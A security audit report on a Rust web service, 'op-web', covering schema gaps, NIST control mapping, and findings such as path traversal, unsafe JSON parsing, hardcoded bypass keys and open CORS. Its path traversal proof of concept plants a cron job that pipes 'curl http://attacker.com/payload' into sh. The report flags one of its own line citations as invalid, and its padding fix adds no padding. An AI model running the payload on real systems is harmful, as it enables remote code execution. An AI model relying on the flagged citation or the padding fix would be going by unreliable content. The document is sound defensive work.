# Production Security & Quality Audit Report

## 1. Schema-as-Code Audit

The following table lists the data contracts, D-Bus interfaces, and message types defined in `op-web`. Any contract represented as ad-hoc Rust structs, untyped strings, or JSON/Value blobs represents a Schema-as-Code gap.

| Item | Type | file:line | Has .proto? | Gap |
| :--- | :--- | :--- | :--- | :--- |
| `McpRequest` / `McpResponse` | JSON-RPC Request/Response | `crates/op-web/src/mcp.rs:48` | No | Ad-hoc Rust structs with manual Serde deserialization instead of versioned Protobuf messages. |
| `JsonRpcRequest` / `JsonRpcResponse` | JSON-RPC Interface | `crates/op-web/src/mcp_compact.rs:42` | No | Defined locally using Serde instead of compiled `.proto` definitions. |
| `IncusState` / `IncusInstance` | Container State | `crates/op-web/src/privacy_container.rs:29` | No | Hardcoded Rust representations of Incus state. Changes on the container orchestrator side can silently break deserialization. |
| `OpenFlowConfig` / `BridgeFlowConfig` / `FlowEntry` | Network Policy State | `crates/op-web/src/privacy_openflow.rs:11` | No | Ad-hoc network flow definitions mapped directly to JSON, bypassing deterministic schemas. |
| `PrivacyRoutesState` / `PrivacyRoute` | Routing Table State | `crates/op-web/src/privacy_routes.rs:14` | No | Ad-hoc structs for network route definitions. |
| `state_manager_client` | D-Bus IPC Payloads | `crates/op-web/src/state_manager_client.rs:32` | No | System-wide state queried and mutated via raw, untyped JSON strings passed through D-Bus (`proxy.call("QueryState")` and `proxy.call("ApplyContractMutation")`). |
| `execute_tool` / `list_tools` / `search_tools` | Meta-Tools & Arguments | `crates/op-web/src/orchestrator/tools.rs:12` | No | Meta-tools defined dynamically inside Rust using untyped `simd_json::OwnedValue` as parameters instead of versioned Protobuf definitions. |
| `DirectToolRequest` / `DirectToolResponse` | REST API Exec Payload | `crates/op-web/src/handlers/tools.rs:73` | No | REST API schemas defined as ad-hoc JSON structs using `simd_json::OwnedValue as Value`. |

---

## 2. OSCAL Coverage Audit

The following table maps system-level controls implemented in the source code to NIST SP 800-53 / FedRAMP controls, noting gaps in OSCAL compliance.

| Control Area | Implemented at file:line | OSCAL Artifact | Gap |
| :--- | :--- | :--- | :--- |
| **AC-2: Account Management** (Magic Link) | `crates/op-web/src/users.rs:198` | None | User account creation and magic link generation are implemented in code but not documented in any System Security Plan (SSP) or Component Definition. |
| **AC-3: Access Enforcement** (IP Security Zones) | `crates/op-web/src/middleware/security.rs:141` | None | IP-based security zones (`AccessZone`) are hardcoded in Rust instead of referencing an external, machine-readable OSCAL policy or Component Definition. |
| **AC-3: Access Enforcement** (Hardcoded Keys) | `crates/op-web/src/middleware/security.rs:16` | None | Secret backdoor credentials bypass authorization, directly violating access control policies. |
| **AU-2: Event Logging** (Execution Tracking) | `crates/op-web/src/mcp_compact.rs:493` | None | Tool execution jobs logged in the Sqlite State Store (`save_job` / `update_job`) without an OSCAL mapping to audit logging controls. |
| **SC-8: Transmission Confidentiality** (WireGuard) | `crates/op-web/src/wireguard.rs:99` | None | WireGuard client configuration generation handles private keys in-memory but has no associated OSCAL encryption control mapping. |

---

## 3. Findings & Recommendations

### [CRITICAL] Path Traversal / Arbitrary File Write in `save_transcript_handler`
- **File:Line**: `crates/op-web/src/handlers/chat.rs:318` and `crates/op-web/src/handlers/chat.rs:429`
- **Description**: The `POST /api/chat/transcript` endpoint parses a user-provided JSON body containing a `filename` field. This string is formatted directly into a file path (`/tmp/{{filename}}`) and written to disk using `tokio::fs::write` without any sanitization or validation. An attacker can supply a filename with directory traversal sequences (e.g., `"filename": "../../../etc/cron.d/malicious_job"` or `"filename": "../../../home/user/.ssh/authorized_keys"`) to write arbitrary data anywhere on the host filesystem accessible to the process owner (which runs with high privileges on `op-dbus`).
- **Proof of Concept**:
  ```bash
  curl -X POST http://localhost:8080/api/chat/transcript \
    -H "Content-Type: application/json" \
    -d '{
      "filename": "../../../etc/cron.d/exploit",
      "messages": [
        {"role": "user", "content": "* * * * * root curl http://attacker.com/payload | sh"}
      ]
    }'
  ```

### [CRITICAL] Memory Unsafety & Undefined Behavior via `unsafe simd_json::from_str`
- **File:Line**: `crates/op-web/src/websocket.rs:81`, `crates/op-web/src/handlers/websocket.rs:74`, `crates/op-web/src/groups_admin.rs:52`, `crates/op-web/src/state_manager_client.rs:34`, `crates/op-web/src/users.rs:124`
- **Description**: The codebase repeatedly executes `unsafe { simd_json::from_str(&mut raw) }` on strings created via `.clone()` or read directly from files/D-Bus. `simd_json` relies heavily on strict memory alignment and requires input strings to be terminated with explicit padding bytes (typically 32 or 64 bytes) to safely perform SIMD-vectorized loads. Standard Rust heap-allocated `String` objects do *not* have this padding. Invoking `unsafe simd_json::from_str` on unpadded buffers triggers out-of-bounds heap memory reads. This can cause immediate segmentation faults (Denial of Service) or potentially lead to adjacent heap memory leakage.
- **Proof of Concept**:
  A remote client sends a WebSocket payload containing exactly-crafted boundary JSON. The server reads it into a standard `String`, clones it, and parses it inside `websocket.rs:81` with `unsafe { simd_json::from_str(&mut raw) }`. The vectorized SIMD execution reads beyond the string boundary, causing a crash.

### [CRITICAL] Hardcoded Bypass API Keys (Control Plane Backdoor)
- **File:Line**: `crates/op-web/src/middleware/security.rs:16`
- **Description**: The `BYPASS_API_KEYS` slice hardcodes secret API tokens:
  ```rust
  const BYPASS_API_KEYS: &[&str] = &[
      "4f8c2b5d-9a1e-4b7c-8d2f-3a6b5c9e4d1f", // Primary MCP access key
      "test-key-huggingface-2024",            // Hugging Face test key
  ];
  ```
  Any request containing one of these keys in the `x-api-key`, `Authorization`, or `x-op-mcp-token` headers bypasses all IP-based security zone checks and is immediately granted full `AccessZone::TrustedMesh` status. This allows administrative control over all system D-Bus interfaces, Open vSwitch bridges, and containers to any unauthorized party possessing or discovering these hardcoded strings.

---

### [MAJOR] Non-Cryptographic Route ID Derivation via Shared Secret
- **File:Line**: `crates/op-web/src/privacy_routes.rs:80`
- **Description**: Route IDs are derived deterministically using HKDF-SHA256 with `PRIVACY_ROUTE_SHARED_SECRET` as the salt and the WireGuard public key as the input. While HKDF is cryptographically sound, exposing the derived Route ID publicly via `privacy_access_message` (e.g., `user.id` or `container_name`) could allow malicious local actors to brute-force or verify other users' public keys if the shared secret is weak or leaked.

### [MAJOR] Insecure CORS Configuration
- **File:Line**: `crates/op-web/src/server.rs:141`
- **Description**: The WebServer router configures CORS with unrestricted wildcard access:
  ```rust
  let cors = CorsLayer::new()
      .allow_origin(Any)
      .allow_methods(Any)
      .allow_headers(Any);
  ```
  Since this server exposes sensitive administrative endpoints, an overly permissive CORS policy allows arbitrary malicious websites visited by an administrator to trigger requests directly to `/api/tools/execute` or other control plane routes.

---

### Recommendations & Remediation Plan

1. **Fix Path Traversal**:
   Implement a strict path sanitation function on the `filename` parameter in `crates/op-web/src/handlers/chat.rs`. Use `std::path::Path::file_name` to discard any directory traversal sequences, or generate random, safe UUIDs instead of accepting arbitrary user-supplied filenames.
   ```rust
   // Remediation example
   let safe_filename = Path::new(&filename)
       .file_name()
       .context("Invalid filename")?
       .to_str()
       .context("Invalid characters")?;
   let filepath = Path::new("/tmp").join(safe_filename);
   ```

2. **Eliminate `unsafe simd_json::from_str`**:
   Replace all instances of `unsafe { simd_json::from_str(&mut raw) }` with the safe `simd_json::from_slice` API by converting the string to a vector and appending the required padding, or transition to the standard, safe `serde_json` crate for untrusted user inputs (such as WebSocket and HTTP bodies).
   ```rust
   // Safe alternative using simd-json padding:
   let mut padded_bytes = text.into_bytes();
   // simd_json expects padding at the end of the slice
   let parsed: WsMessage = simd_json::from_slice(&mut padded_bytes)?;
   ```

3. **Remove Hardcoded Backdoor Keys**:
   Remove `BYPASS_API_KEYS` from the source code. Require tokens to be loaded dynamically from a secure local database or configuration file with strict file permissions (`0600`), and rotate them periodically.

4. **Define Schemas as Code**:
   Consolidate all D-Bus and REST endpoints into Protocol Buffer schemas (`.proto` files). Generate Rust message bindings using `prost` or `tonic` during compilation, ensuring that contract serialization is standardized, versioned, and structurally sound.

5. **Generate OSCAL System Security Plan (SSP)**:
   Generate machine-readable OSCAL component definitions documenting the REST, gRPC, and WebSocket boundaries of `op-web`. Document the mapping of authentication (`users.rs`) and authorization (`middleware/security.rs`) systems directly to NIST SP 800-53 controls (AC-2, AC-3, SC-8) to ensure regulatory compliance.

---
## ⚠ Citation Warnings
- `crates/op-web/src/middleware/security.rs:141`: file has 139 lines
